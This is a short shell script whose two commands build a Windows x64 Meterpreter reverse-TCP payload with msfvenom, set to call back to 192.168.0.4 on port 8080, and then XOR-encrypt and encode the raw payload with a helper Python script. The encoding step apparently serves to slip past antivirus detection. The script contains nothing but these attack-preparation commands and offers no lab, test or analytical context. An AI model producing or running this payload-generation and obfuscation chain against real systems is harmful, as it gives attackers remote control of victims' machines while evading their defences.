#!/bin/sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.4 LPORT=8080 -f raw -o reverse.raw
python3 xor-encrypt-encode.py reverse.raw xyz reverseencoded.txt
